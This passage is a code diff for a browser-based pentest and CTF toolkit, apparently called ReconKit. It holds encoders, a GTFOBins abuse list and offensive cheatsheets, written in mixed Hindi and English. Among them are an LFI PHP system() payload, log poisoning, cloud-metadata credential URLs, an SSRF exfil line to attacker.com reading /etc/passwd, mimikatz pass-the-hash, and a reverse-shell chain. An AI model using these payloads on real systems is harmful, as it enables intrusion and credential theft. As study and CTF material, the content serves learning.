+  const T=[0xd76aa478,0xe8c7b756,0x242070db,0xc1bdceee,0xf57c0faf,0x4787c62a,0xa8304613,0xfd469501,0x698098d8,0x8b44f7af,0xffff5bb1,0x895cd7be,0x6b901122,0xfd987193,0xa679438e,0x49b40821,0xf61e2562,0xc040b340,0x265e5a51,0xe9b6c7aa,0xd62f105d,0x02441453,0xd8a1e681,0xe7d3fbc8,0x21e1cde6,0xc33707d6,0xf4d50d87,0x455a14ed,0xa9e3e905,0xfcefa3f8,0x676f02d9,0x8d2a4c8a,0xfffa3942,0x8771f681,0x6d9d6122,0xfde5380c,0xa4beea44,0x4bdecfa9,0xf6bb4b60,0xbebfbc70,0x289b7ec6,0xeaa127fa,0xd4ef3085,0x04881d05,0xd9d4d039,0xe6db99e5,0x1fa27cf8,0xc4ac5665,0xf4292244,0x432aff97,0xab9423a7,0xfc93a039,0x655b59c3,0x8f0ccc92,0xffeff47d,0x85845dd1,0x6fa87e4f,0xfe2ce6e0,0xa3014314,0x4e0811a1,0xf7537e82,0xbd3af235,0x2ad7d2bb,0xeb86d391];
+  const bytes=rkBytes(str);
+  const bitLen=bytes.length*8;
+  bytes.push(0x80);
+  while(bytes.length%64!==56)bytes.push(0);
+  const hi=Math.floor(bitLen/4294967296), lo=bitLen>>>0;
+  bytes.push(lo&255,(lo>>>8)&255,(lo>>>16)&255,(lo>>>24)&255,hi&255,(hi>>>8)&255,(hi>>>16)&255,(hi>>>24)&255);
+  let h0=1732584193,h1=4023233417,h2=2562383102,h3=271733878;
+  for(let i=0;i<bytes.length;i+=64){
+    const M=[];
+    for(let j=0;j<16;j++)M.push(((bytes[i+j*4])|(bytes[i+j*4+1]<<8)|(bytes[i+j*4+2]<<16)|(bytes[i+j*4+3]<<24))>>>0);
+    let a=h0,b=h1,c=h2,d=h3;
+    for(let j=0;j<64;j++){
+      let f,g;
+      if(j<16){f=(b&c)|(~b&d);g=j;}
+      else if(j<32){f=(b&d)|(c&~d);g=(5*j+1)%16;}
+      else if(j<48){f=b^c^d;g=(3*j+5)%16;}
+      else{f=c^(b|~d);g=(7*j)%16;}
+      const n=(a+f+M[g]+T[j])>>>0;
+      const ob=b;
+      a=d; d=c; c=b; b=(rkRotl(n,S[j])+ob)>>>0;
+    }
+    h0=(h0+a)>>>0;h1=(h1+b)>>>0;h2=(h2+c)>>>0;h3=(h3+d)>>>0;
+  }
+  const le=n=>{let o="";for(let i=0;i<4;i++)o+=((n>>(8*i))&255).toString(16).padStart(2,"0");return o;};
+  return le(h0)+le(h1)+le(h2)+le(h3);
+}
+async function sha256h(str){
+  if(!window.crypto||!window.crypto.subtle)throw new Error("SHA-256 ke liye https (secure context) chahiye");
+  const u=new Uint8Array(await crypto.subtle.digest("SHA-256",new TextEncoder().encode(str)));
+  return [...u].map(x=>x.toString(16).padStart(2,"0")).join("");
+}
+
+/* ================= MINI-MARKDOWN (GTFOBins + wiki render) ================= */
+function mdLite(src){
+  const escL=s=>s.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");
+  const inline=s=>escL(s).replace(/\*\*([^*]+)\*\*/g,"<b>$1</b>").replace(/`([^`]+)`/g,"<code class='tcode'>$1</code>");
+  const lines=src.replace(/\r\n/g,"\n").split("\n");
+  let html="",inCode=false,codeBuf=[],inTable=false,tRows=[];
+  const flushTable=()=>{
+    if(!inTable)return;
+    inTable=false;
+    html+="<table class='tmd'><tr>"+tRows[0].map(c=>"<th>"+inline(c)+"</th>").join("")+"</tr>";
+    for(let i=1;i<tRows.length;i++)html+="<tr>"+tRows[i].map(c=>"<td>"+inline(c)+"</td>").join("")+"</tr></table>";
+    tRows=[];
+  };
+  for(const raw of lines){
+    if(/^```/.test(raw.trim())){
+      if(inCode){html+="<pre class='tcode-block'>"+escL(codeBuf.join("\n"))+"</pre>";codeBuf=[];inCode=false;}
+      else{flushTable();inCode=true;}
+      continue;
+    }
+    if(inCode){codeBuf.push(raw);continue;}
+    const t=raw.trim();
+    if(/^[\s|]*-[\s|]*$/.test(t)&&t.indexOf("|")>=0){if(inTable)continue;else continue;}
+    if(t.indexOf("|")>=0&&t.split("|").length>=3&&!/^https?:/.test(t)){
+      const cells=t.replace(/^\||\|$/g,"").split("|").map(c=>c.trim());
+      if(!inTable){inTable=true;tRows=[cells];}
+      else tRows.push(cells);
+      continue;
+    }
+    if(inTable)flushTable();
+    if(!t){html+="";continue;}
+    if(/^###\s/.test(t))html+="<div class='tmd-h3'>"+inline(t.slice(4))+"</div>";
+    else if(/^##\s/.test(t))html+="<div class='tmd-h2'>"+inline(t.slice(3))+"</div>";
+    else if(/^#\s/.test(t))html+="<div class='tmd-h1'>"+inline(t.slice(2))+"</div>";
+    else if(/^&gt;/.test(escL(t))||/^>/.test(t))html+="<div class='tmd-q'>"+inline(t.replace(/^>\s*/,""))+"</div>";
+    else if(/^[-*]\s/.test(t))html+="<div class='tmd-li'>• "+inline(t.slice(2))+"</div>";
+    else if(/^\d+\.\s/.test(t))html+="<div class='tmd-li'>"+inline(t.replace(/^\d+\.\s/,""))+"</div>";
+    else html+="<div class='tmd-p'>"+inline(t)+"</div>";
+  }
+  if(inCode)html+="<pre class='tcode-block'>"+escL(codeBuf.join("\n"))+"</pre>";
+  if(inTable)flushTable();
+  return html;
+}
+
+/* ================= CLASSIC TRANSFORMS ================= */
+function rot13(s){return s.replace(/[a-zA-Z]/g,c=>{const base=c<="Z"?65:97;return String.fromCharCode(((c.charCodeAt(0)-base+13)%26)+base);});}
+function atbash(s){return s.replace(/[a-zA-Z]/g,c=>String.fromCharCode(c<="Z"?155-c.charCodeAt(0):219-c.charCodeAt(0)));}
+const MORSE_MAP={A:".-",B:"-...",C:"-.-.",D:"-..",E:".",F:"..-.",G:"--.",H:"....",I:"..",J:".---",K:"-.-",L:".-..",M:"--",N:"-.",O:"---",P:".--.",Q:"--.-",R:".-.",S:"...",T:"-",U:"..-",V:"...-",W:".--",X:"-..-",Y:"-.--",Z:"--..","0":"-----","1":".----","2":"..---","3":"...--","4":"....-","5":".....","6":"-....","7":"--...","8":"---..","9":"----.",".":".-.-.-",",":"--..--","?":"..--..","!":"-.-.--","/":"-..-.","@":".--.-.","(":"-.--.",")":"-.--.-","=":"-...-","+":".-.-.","-":"-....-","_":"..--.-","\"":".-..-.",":":"---...",";":"-.-.-.","$":"...-..-","&":"....-."};
+const MORSE_REV={};Object.keys(MORSE_MAP).forEach(k=>{MORSE_REV[MORSE_MAP[k]]=k;});
+function morseEncode(s){return s.toUpperCase().split("").map(c=>MORSE_MAP[c]!==undefined?MORSE_MAP[c]:(c===" "?"  ":"")).join(" ");}
+function morseDecode(s){return s.trim().split(/\s{2,}/).map(w=>w.trim().split(/\s+/).map(c=>MORSE_REV[c]!==undefined?MORSE_REV[c]:"").join("")).join(" ");}
+
+const B32ABC="ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
+function b32enc(s){
+  const bytes=new TextEncoder().encode(s);
+  let bits="";for(const b of bytes)bits+=b.toString(2).padStart(8,"0");
+  let o="";
+  for(let i=0;i<bits.length;i+=5){
+    const g=bits.substr(i,5).padEnd(5,"0");
+    o+=B32ABC[parseInt(g,2)];
+  }
+  return o;
+}
+function b32dec(s){
+  s=s.replace(/=+$/g,"").toUpperCase().replace(/\s+/g,"");
+  if(!s)throw new Error("empty");
+  let bits="";
+  for(const c of s){const i=B32ABC.indexOf(c);if(i<0)throw new Error("invalid base32 char: "+c);bits+=i.toString(2).padStart(5,"0");}
+  const b=[];
+  for(let i=0;i+8<=bits.length;i+=8)b.push(parseInt(bits.substr(i,8),2));
+  return new TextDecoder().decode(new Uint8Array(b));
+}
+function num2bin(n){
+  let v=parseInt(n,10);
+  if(isNaN(v))v=parseInt(n,16);
+  if(isNaN(v)&&/^[01]+$/.test(n))v=parseInt(n,2);
+  if(isNaN(v)||Math.abs(v)>9007199254740991)throw new Error("invalid/overflow number: "+n);
+  return v.toString(2);
+}
+function bin2num(n){
+  n=String(n).trim().replace(/^0b/i,"");
+  if(!/^[01]+$/.test(n))throw new Error("invalid binary: "+n);
+  const v=parseInt(n,2);
+  return v+" (dec) · 0x"+v.toString(16)+" (hex)";
+}
+
+/* ================= GTFOBins (curated list + live fetch) ================= */
+const GTFO_BINS=[
+  ["awk","system() via BEGIN block / getline from shell"],
+  ["bash","-i -c, IFS obfuscation, variable tricks"],
+  ["cat","file read/write, exfil support"],
+  ["cp","copy to /tmp for reverse shell staging"],
+  ["curl","download payloads / exfil data"],
+  ["dd","overwrite files, block-level exfil"],
+  ["df","read arbitrary files via -t trick"],
+  ["diff","exec shell from a file"],
+  ["dig","DNS exfil channel"],
+  ["du","run commands via --summary bug patterns"],
+  ["env","export + exec, shell reset"],
+  ["find","-exec / -execdir root shell classic"],
+  ["fortune","shell exec via /dev/stdin"],
+  ["ftp","upload/download exfil (interactive)"],
+  ["gawk","same as awk + getline"],
+  ["git","clone exfil, archive tricks"],
+  ["grep","-r read, -f with process substitution"],
+  ["hexdump","read arbitrary files"],
+  ["id","basic — check for SUID"],
+  ["ip","network config, interface exfil"],
+  ["less","!sh / :shell escape"],
+  ["ln","hardlink tricks, root file writes"],
+  ["logname","shell exec via stdin"],
+  ["look","read files, shell escape"],
+  ["ls","read via -f, exec via --quoting-style"],
+  ["mail","send/receive exfil"],
+  ["make","-f with recipe exec"],
+  ["man","shell escape !, pager sh"],
+  ["mv","overwrite /etc/crontab etc."],
+  ["nano","macro exec, shell escape !"],
+  ["netcat","reverse shell classic, listener"],
+  ["netstat","conn inspection, -e tricks"],
+  ["nice","priority abuse, shell spawn"],
+  ["nl","read + shell escape"],
+  ["nohup","persist after logout"],
+  ["nmap","NSE script exec, interaction mode"],
+  ["od","read arbitrary files, --shell"],
+  ["openssl","s_client/s_time exfil, enc"],
+  ["passwd","-S check, hash read"],
+  ["ping","-i timing, -O icmp shell (busybox)"],
+  ["pr","-l read, shell escape"],
+  ["printf","write files, format strings"],
+  ["ps","process recon, -eF env dump"],
+  ["pwd","cwd check, /dev/fd tricks"],
+  ["python","os.system classic, pty spawn"],
+  ["python3","same — pty + socket reverse shell"],
+  ["quota","exec via quotaon path"],
+  ["ruby","system, backtick exec"],
+  ["sed","e flag exec, shell from file"],
+  ["seq","-f format, shell via -s"],
+  ["sh","/dev/tcp reverse shell, -c"],
+  ["shuf","exec via -i? (rare)"],
+  ["sort","-o write, -M check"],
+  ["ssh","-i key use, agent forward abuse"],
+  ["ssh-keygen","keygen + ssh-add tricks"],
+  ["sshpass","non-interactive ssh exfil"],
+  ["stat","file read, -c format abuse"],
+  ["strace","trace + exec (-f -e execve)"],
+  ["su","-c root if creds known"],
+  ["sudo","GTFOBins per binary — biggest privesc"],
+  ["tac","read, shell escape"],
+  ["tail","-f follow, shell escape"],
+  ["tar","--checkpoint-action exec (RCE)"],
+  ["tclsh","exec, pty, socket"],
+  ["tmux","attach to existing root session"],
+  ["toe","capable read, exec trick"],
+  ["top","!shell escape, k kill"],
+  ["touch","create files, -t time tricks"],
+  ["tr","transform + write, shell"],
+  ["tshark","filter + lua exec"],
+  ["unzip","extract exfil, -d write"],
+  ["vi",":!sh classic, :w! exec"],
+  ["vim","same as vi + macros"],
+  ["wget","download payloads, -p site exfil"],
+  ["which","path recon"],
+  ["whoami","who am i (lol)"],
+  ["xargs","-I exec classic, -o write"],
+  ["xxd","read/write files, -r write"],
+  ["zip","archive exfil, -d delete"],
+  ["zsh","-i interactive, exec"]
+];
+async function gtfoFetch(bin){
+  const r=await smartFetch("https://raw.githubusercontent.com/GTFOBins/GTFOBins.github.io/master/_gtfobins/"+encodeURIComponent(bin));
+  if(!r.text)throw new Error("empty response");
+  if(r.text.trim().indexOf("404: Not Found")===0)throw new Error("404 - bin GTFOBins me nahi mila (gtfo-list dekho): "+bin);
+  return gtfoParse(r.text);
+}
+function gtfoParse(yml){
+  const lines=yml.replace(/\r\n/g,"\n").split("\n");
+  const items=[];
+  let cur=null,mode=null,buf=null;
+  const flush=()=>{if(cur&&mode&&buf){cur[mode]=buf.join("\n");}mode=null;buf=null;};
+  for(let i=0;i<lines.length;i++){
+    const l=lines[i];
+    const ind=(l.match(/^ */)||[""])[0].length;
+    const t=l.trim();
+    if(ind<2)continue;
+    if(ind===2&&!/^-/ .test(l)&&/\s*:\s*$/.test(t)){
+      flush();
+      cur={func:t.replace(/\s*:\s*$/,""),code:"",comment:"",refs:[]};
+      items.push(cur);
+      continue;
+    }
+    if(!cur)continue;
+    if(ind===2&&/^-( code|comment|reference):/.test(t)){
+      flush();
+      const key=t.slice(2).split(":")[0];
+      mode=key;buf=(key==="refs")?[]:[];
+      continue;
+    }
+    if(ind===4&&(t==="code: |-"||t==="code: |"||t==="comment: |-"||t==="comment: |"||t==="reference:")){
+      flush();
+      mode=t.split(":")[0];buf=[];
+      continue;
+    }
+    if(mode==="refs"){
+      if(/^https?:/.test(t))cur.refs.push(t);
+      else if(ind<4){flush();}
+      continue;
+    }
+    if(mode){
+      if(ind>=6)buf.push(l.slice(6));
+      else flush();
+    }
+  }
+  flush();
+  return items;
+}
+
+function trophyParse(csv){
+  const lines=csv.replace(/\r\n/g,"\n").replace(/\r/g,"\n").split("\n");
+  const sections=[];
+  let sec=null,capturing=false;
+  for(let i=0;i<lines.length;i++){
+    let l=lines[i].trim();
+    const cells=l.split(",").map(x=>x.trim());
+    if(!l){capturing=false;continue;}
+    const first=cells[0];
+    if(first.indexOf("Linux Boxes:")===0){
+      sec={name:(sec&&sec.name)?sec.name:"List",cols:[],links:[]};
+      sec.cols=cells.filter(c=>c).map(c=>({label:c.replace(/\.$/,"").replace(/\./g," ").trim(),items:[]}));
+      sections.push(sec);
+      capturing=true;
+      continue;
+    }
+    if(/^[A-Za-z][A-Za-z0-9 ]*:$/.test(first)){
+      sec={name:first.slice(0,-1),cols:[],links:[]};
+      sections.push(sec);
+      capturing=false;
+      continue;
+    }
+    if(capturing&&sec&&sec.cols.length){
+      for(let idx=0;idx<sec.cols.length&&idx<cells.length;idx++){
+        if(cells[idx]&&cells[idx]!==":")sec.cols[idx].items.push(cells[idx]);
+      }
+      continue;
+    }
+    if(sec&&first.indexOf("http")>=0){
+      sec.links.push(first);
+    }
+  }
+  return sections;
+}
+
+/* ================= WIKI (built-in cheatsheets) ================= */
+const WIKI={
+"oscp":
+`# OSCP Attack Flow (davila.me checklist style)
+## 1. Recon (external + internal)
+- Passive: crt.sh, SecurityTrails, theHarvester, Wayback Machine, Shodan/FOFA/ZoomEye
+- Subdomains: subfinder + amass + massdns brute (subjs wordlist), wildcard check
+- DNS: dnsrecon/fierce — A, AAAA, MX, NS, TXT (SPF/DMARC/DKIM), CAA, SRV
+- Ports: nmap -sV -sC top 1000 → full -p- → -A on open services
+- Web: whatweb, ffuf/gobuster (SecLists), wpscan
+## 2. Exploitation
+- Service version → searchsploit / exploit-db / Metasploit
+- Web: SQLi (sqlmap), XSS, LFI/RFI, command injection, auth bypass, JWT
+- Creds: hydra, medusa, john/hashcat, default creds lists
+- LLMNR/NBT-NS (internal): responder → NTLM → crack
+## 3. Post-Exploitation
+- Linux: linpeas.sh → sudo -l, SUID (GTFOBins), capabilities, cron, kernel LPE
+- Windows: winpeas.exe → whoami /all, services, AlwaysInstallElevated, tokens
+- Pivot: chisel, ligolo-ng, proxychains, metasploit autoroute, ssh -D
+## 4. Report
+- What / Where / How / Impact + PoC + remediation
+- Timeline, CVSS score, evidence (commands + output + screenshots)
+## Toolkit
+nmap · subfinder · massdns · ffuf · sqlmap · searchsploit · metasploit · hydra · john · hashcat · responder · linpeas · winpeas · chisel · proxychains`,
+
+"linux-privesc":
+`# Linux Privilege Escalation (THM linprivesc style)
+## Quick check
+- whoami / id / uname -a / cat /etc/os-release
+- sudo -l  → (root) NOPASSWD entries = instant privesc
+## 1. SUID binaries
+- find / -perm -u=s -type f 2>/dev/null
+- Har SUID binary → gtfo <bin> dekho
+- Classic: SUID find → sudo find . -exec /bin/sh \;
+- SUID vim → :!sh · SUID python3 → python3 -c 'import os; os.execl("/bin/sh","sh","-c")'
+## 2. Capabilities
+- getcap -r / 2>/dev/null
+- CAP_SYS_ADMIN, CAP_SETUID, CAP_DAC_OVERRIDE, CAP_NET_ADMIN → GTFOBins
+## 3. Writable files & cron
+- ls -la /etc/cron* /var/spool/cron /etc/crontab
+- Writable cron script → backtick / $(cmd) inject
+- /etc/passwd writable → user add · /etc/shadow readable → hash crack
+- /etc/ld.so.preload writable → .so backdoor
+## 4. sudo abuse
+- sudo -l output: (root) NOPASSWD: /usr/bin/vim → gtfo vim
+- EDITOR=/bin/sh sudo EDITOR=vi visudo
+- sudo tar, sudo docker, sudo python3, sudo find, sudo less → direct
+## 5. Kernel & misc
+- uname -r: kernel <4.18 Dirty Cow · <6.1 Dirty Pipe (Cve-2022-0847)
+- /var/run/docker.sock writable → mount / → root
+- /home/*/.ssh/id_rsa → SSH as that user
+- .bash_history me tokens/passwords dhundo
+- tmux/screen writable socket → attach to root session
+## Tools
+linpeas.sh (all-in-one) · pspy (hidden process monitor) · linux-smart-enumeration.sh`,
+
+"windows-privesc":
+`# Windows Privilege Escalation
+## Quick check
+- whoami /all · systeminfo · net user · net localgroup administrators
+- whoami /priv → SeImpersonatePrivilege = JuicyPotatoNG / PrintSpoofer
+## 1. AlwaysInstallElevated
+- Reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
+- HKCU + HKLM dono 1 → mshta/MSI install as SYSTEM → reverse shell
+## 2. Unquoted service paths
+- wmic service get name,displaypath
+- Path with spaces + no quotes → copy payload to short path (C:\\PROGRA~1\\...)
+## 3. DLL hijack / service path
+- Writable service dir → replace binary + sc stop/start
+- DLL search order: procmon se dekho kon si DLL load fail → uska naam do
+## 4. Stored creds & tokens
+- mimikatz: sekurlsa::logonpasswords (creds) · sekurlsa::eats (pass-the-hash)
+- tokens: impersonation (comsvcs.dll / tokens.exe)
+- PtH: evil-winrm -Hash · pth-winexe · mimikatz sekurlsa::pth
+- net session → admin access ka quick check
+## 5. UAC bypass & persistence
+- UACME: fodhelper, eventvwr, sdclt
+- Persistence: schtasks /create · new service · startup folder · WMI event
+## Tools
+winpeas.exe · seatbelt · sharpbloodhound + bloodhound · metasploit`,
+
+"web":
+`# Web App Recon + Testing (OWASP Top-10 style)
+## Recon
+- Headers: curl -sI / → Server, X-Powered-By, CSP, HSTS, CORS
+- robots.txt, sitemap.xml, security.txt
+- JS bundles: API endpoints, keys, tokens (ffuf -e js)
+- Wayback (timemap/cdx) + crt.sh → historical endpoints
+## Injection
+- SQLi: quote → error/boolean; sqlmap -u <url> --dbs (rate limit on)
+- XSS: reflected/stored/DOM — img onerror, svg onload
+- Command injection: ; id, | whoami, backtick id, sleep timing
+- SSTI: {{7*7}} Jinja · ${7*7} Spring · <%= 7*7 %> ERB
+## Auth & session
+- Weak/default creds, user enumeration (error diff, timing)
+- JWT: alg none, HS/RS confusion, weak secret (hashcat -m 16500)
+- IDOR: user id swap, PUT/PATCH method, mass assignment
+- Password reset: Host header poisoning, token predictability
+## Files & upload
+- LFI: ../../etc/passwd, php://filter chain (wiki lfi)
+- Upload: polyglot, .phar/.phtml, .htaccess, double extension
+- SSRF: internal IPs, 169.254.169.254, file://, DNS rebinding (wiki ssrf)
+## Misconfig
+- .git / .env / .DS_Store / backups (ReconKit Site Scan me built-in)
+- CORS *, directory listing, verbose errors, old versions`,
+
+"recon":
+`# Recon Playbook (OSINT → subs → ports → content)
+## 1. Passive OSINT
+- crt.sh: crt.sh/?q=%25.<domain> — certificate transparency
+- DNS: A/AAAA/MX/NS/TXT (SPF/DMARC/DKIM)/CAA/SOA
+- WHOIS/RDAP: registrar, created/expiry (ReconKit: whois <dom>)
+- Wayback: old endpoints, deleted params
+- Shodan/FOFA/ZoomEye: open ports + services (API wale)
+## 2. Subdomains
+- Brute: massdns/ffuf + subjs + SecLists discovery lists
+- Permutation: subfinder + amass passive sources
+- Wildcard check: testrandom123.<dom> resolve ho?
+- Subdomain takeover: dead CNAME (herokuapp, ghost.io, fastly, bitbucket)
+## 3. Ports & services
+- nmap -sV -sC -p- (full) → -A on open
+- Service version → CVE match (searchsploit)
+## 4. Content
+- Dirbust: ffuf -w SecLists/Discovery -x txt,php,html
+- Tech detect: wappalyzer/whatweb → version → CVE
+- Secrets in source: AWS keys, API keys, GMap keys (ReconKit: scan <url>)
+## Flow
+OSINT → subs → ports → web fuzz → vulns → exploit → pivot`,
+
+"gmap":
+`# Google Maps API Key Recon (bug bounty flow)
+## Kahan milte hain (Chirag Soni writeup ka flow)
+- subfinder + httprobe se live subs nikalo, phir **manual check karo** (tool pe depend mat karo)
+- Admin login / static pages ka bhi **source dekho** — writeup me key source code me mili (CTRL+U habit)
+- JS bundles: AIza[0-9A-Za-z\-_]{35} pattern
+- Wayback archive me puri history scan karo
+- ReconKit: Site Scan → "verify GMap keys" (auto detect + verify)
+## Verify — SAARE endpoints test karo (key point!)
+- **streaak/keyhacks** repo me GMap endpoints hain — har endpoint pe try karo:
+- Static Map (aksar restricted hota hai)
+- Embed Map
+- Street View
+- Geocoding
+- Directions
+- **Ek endpoint restricted = key blocked nahi** — baaki unrestricted hain to unauthorized calls possible
+## Impact (report me likho)
+- Unauthorized API calls → company ka bill (financial damage)
+- Quota exhaustion → DoS (quota/billing restriction na ho to)
+## Report
+- HackerOne / Integrity / RDP programs me accept hota hai
+- Bugcrowd aksar informative close karta hai — wahan time waste mat karo
+## Fix (recommendation)
+- HTTP referrer + API restrictions
+- Quota cap + budget alerts
+- Key rotation + environment separation`,
+
+"jwt":
+`# JWT Attack Cheatsheet
+## Decode
+- base64url(header) + base64url(payload) — ReconKit: jwt <token>
+## Attacks
+1. **alg none** — alg=none (variants: NONE, NoNe, nOnE) → unsigned token
+2. **Weak secret (HS256)** — hashcat -m 16500 token rockyou.txt · ReconKit JWT Lab brute (~250 keys)
+3. **HS/RS confusion** — server RS256 check karta hai, par HS256 accept → public key se HS sign karo
+4. **kid injection** — path traversal (../../../etc/passwd) ya SQLi (kid='+OR+1=1--)
+5. **jku/jwk** — remote key URL = SSRF · embedded key = weak key check
+6. **Claim manipulation** — exp future, aud/iss mismatch, role escalation (signature valid rahi)
+## Claims dhyan me
+- iat/exp/nbf — time claims (clock skew exploit)
+- iss/aud — multi-tenant mismatch
+- sub/role/permissions — privilege fields
+## Tools
+jwt_tool · hashcat -m 16500 · JWT2Go · ReconKit JWT Lab (decode + none + brute + verify)`,
+
+"lfi":
+`# Local File Inclusion (LFI)
+## Basic
+- ?page=../../etc/passwd
+- URL encode: %2e%2e%2f · double encode: %252e%252e%252f
+- Trailing slash: ....//....//etc/passwd
+- Null byte: %00 (PHP <5.3.4)
+## PHP wrappers
+- php://filter/convert.base64-encode/resource=index.php → source read
+- php://input → POST data (RCE with allow_url_include)
+- data://text/plain,php <?php system($_GET['c']); ?>
+- phar:// → post-exploitation
+## Blind LFI (log poisoning)
+- User-Agent me: <?php system('id');?>
+- Targets: access.log, error.log, w00log1 (IIS)
+- php-fpm → phar archive se RCE
+## Read targets
+- /etc/passwd (hashes) · /etc/shadow (if readable)
+- /proc/self/environ (env vars, tokens)
+- /proc/self/cmdline · /dev/stdin
+## Chain
+LFI → source read → secrets/keys → RCE (data:// ya log poison)`,
+
+"ssrf":
+`# SSRF Cheatsheet
+## Basics
+- ?url=http://127.0.0.1:8080/admin
+- 302 redirect → internal (server redirect follow karta hai)
+- Schemes: file://, gopher://, dict://, ftp://
+## Cloud metadata (biggest win)
+- AWS: http://169.254.169.254/latest/meta-data/iam/security-credentials/
+- GCP: http://metadata.google.internal/computeMetadata/v1/ (header: Metadata-Flavor: Google)
+- Azure: http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01
+## Bypasses
+- Decimal IP: 2130706433 (=127.0.0.1)
+- Hex: 0x7f000001 · Octal: 0177.0.0.1
+- [::1] IPv6 · 0.0.0.0
+- DNS rebinding: TTL 0, first hit 1.1.1.1, second 127.0.0.1
+- URL tricks: http://127.0.0.1@evil.com · http://evil.com\\@127.0.0.1
+## Exfil
+- Error-based (response size diff)
+- DNS exfil: http://attacker.com/$(cat /etc/passwd)
+- Timing-based (blind)
+## Defense
+- Egress allowlist · schema restrict (http/https only)
+- No redirect follow · resolve DNS at app layer (SSRF guard)`,
+
+"ctf":
+`# CTF Starter Guide
+## Web
+- view-source, .js files, .map files (source maps = full source)
+- Parameter fuzzing, method override (PUT/PATCH)
+- SQLi/XSS/LFI/SSRF/JWT/IDOR (upar ke cheatsheets)
+- Race conditions: Turbo Intruder / Burp Turbo
+## Crypto
+- Caesar, Vigenere, RSA (small e, p·q factoring), AES (ECB, key reuse)
+- Tools: CyberChef, RsaCtfTool, z3 (constraints)
+- Frequency analysis, known-plaintext attack
+## Forensics
+- strings, binwalk, exiftool, file (magic check)
+- Disk: foremost (carving), Autopsy
+- Memory: volatility (Linux) / mimikatz (Win)
+- Stego: steghide, stegsolve, zsteg, binwalk
+## Pwn / Reverse
+- gdb, Ghidra, radare2
+- Buffer overflow: cyclic pattern (pattern_create), ret overwrite
+- ROP chains, shellcode (msfvenom)
+## Misc
+- Base64, hex, morse, rot13, atbash — ReconKit terminal me sab built-in
+- Audio: spectrogram (dcode) · QR · DNS · ICMP
+## Strategy
+- Easy → points → technique seekho → hard
+- Writeups: 0xdf, TwoMillion, HTB blog, pwn.college`,
+
+"writeups":
+`# Writeup Method + HTB TwoMillion (0xdf) Full Chain
+## HTB: TwoMillion (0xdf writeup, 2023) — distilled chain
+**Box:** Easy · Linux · 22/80 (ssh, nginx) · Ubuntu 22.04 · non-competitive release
+1. **Recon**: nmap → 22/80; site = 2017 HTB throwback; /invite page (original invite challenge)
+2. **Invite Code (client-side win)**: /js/inviteapi.min.js me devtools me **makeInviteCode** function mila
+→ POST /api/v1/invite/how/to/generate → response **ROT13** tha → decode →
+→ POST /api/v1/invite/generate → code **base64** tha → decode → valid invite code
+3. **Auth + API enum**: register/login → /api/v1 route list me **admin endpoints** dikhe
+4. **Broken access control**: PUT /api/v1/admin/settings/update **401 nahi deta** (baaki sab 401)
+→ Content-Type: application/json → email → **is_admin: 1** → ab main admin (mass assignment)
+5. **Command injection**: /api/v1/admin/vpn/generate me username = **bash reverse shell**
+(semicolon + # comment) → **www-data shell**
+6. **Pivot**: webroot me **.env** → DB_PASSWORD → **su/ssh admin** → user.txt
+7. **Root**: /var/mail/admin me hint (OverlayFS/FUSE CVE) → kernel 5.15.70 (Ubuntu 22.04)
+→ **CVE-2023-0386** (OverlayFS SUID copy bug) → POC → root.txt
+**Lessons**: JS source hamesha padho · /api route list dhundo · status code diff (401 vs 200) ·
+webroot me .env · mail files me hints
+## Best writeup sources (bookmarked batch)
+- **0xdf** (0xdf.gitlab.io) — methodology-driven: recon→exploit→pwn→privesc
+- **TwoMillion blog** — clean writeups, har step explanation ke saath
+- **THM free rooms** — terminal me: **thm** (390+ rooms)
+- **davila.me OSCP checklist** — attack flow + tool list
+- **Exploit-DB** — real-world exploits, source padho
+- **pwn.college** — CTF/pwn education (Assembly → Hacking)
+- **InternalAllTheThings / HackTricks** — reference
+## Apna writeup format
+1. Recon: kya mila (commands + output)
+2. Vuln: kya tha, kaise discover kiya
+3. Exploit: exact commands + output
+4. Post-exploitation: privesc steps
+5. Learnings: next time kya improve karunga`,
+
+"hashcat":
+`# Hashcat Quick Reference (hashcat wiki distilled)
+## Common modes (-m)
+- 0 = MD5 · 100 = SHA1 · 500 = NTLM · 7500 = MD4
+- 1000 / 1400 = SHA256 · 1010 = SHA384 · 1020 / 1800 = SHA512
+- 5600 = NetNTLMv1 · 5800 = NetNTLMv2
+- **16500 = JWT (HS256)** — JWT weak secret brute iske liye
+## Example hashes (verify ke liye)
+- MD5("password") = 5f4dcc3b5aa765d61d8327deb882cf99
+- SHA1("password") = 5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8
+- SHA256("password") = 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
+- NTLM("password") = aad3b435b51404eeaad3b435b51404ee:482c811da5d5b4bc6d497ffa98491e38
+## Attack modes (-a)
+- -a 0 dictionary · -a 1 hybrid (dict+mask) · -a 3 pure mask · -a 6/7 hybrid
+- --increment (mask length auto-increase) · -w 4 (workload) · -O (optimized kernels)
+## Example
+- hashcat -m 0 -a 0 hashes.txt rockyou.txt
+- hashcat -m 16500 jwt.txt rockyou.txt
+- hashcat -m 100 -a 3 sha1.txt '?d?d?d?d?d?d?d?d?d?d'
+## Terminal me (offline, GPU nahi chahiye)
+- **crackmd5 <hash>** / **cracksha1 <hash>** — built-in ~10k dictionary
+- **md5 <str>** / **sha1 <str>** — hash generate karke compare karo
+- badi dictionary ke liye: hashcat (GPU) 100x+ fast`,
+
+"stego":
+`# Steganography (CTF misc)
+## Audio (spectrogram)
+- Audio file me visual message chhupa hota hai
+- **dcode.fr/spectral-analysis** (browser, free) — spectrogram dekho
+- Audacity bhi chalega: View → Spectrogram
+- Hidden text usually horizontal lines me hota hai
+## Images
+- **LSB** (least significant bit): stegsolve — RGB/Alpha channels dekho
+- **zsteg** (stego tool): zsteg filename.png
+- **steghide**: steghide extract -sf img.png (passphrase maangega)
+- **EXIF**: exiftool img.jpg (metadata me data)
+- **File magic**: file img.png — PNG ho to actually JPEG?
+## Files
+- **binwalk** — embedded files: binwalk -e file
+- **foremost** — carving: foremost -i disk.img -o out/
+- **strings** — plain text secrets
+## QR / DNS / ICMP
+- QR image → zbarimg ya phone se decode
+- DNS TXT records me data (dnsrecon)
+- ICMP payloads: icmpsh
+## CTF flow (fast)
+file → strings → binwalk → (img) stegsolve/zsteg → (audio) spectrogram → EXIF
+## ReconKit terminal me
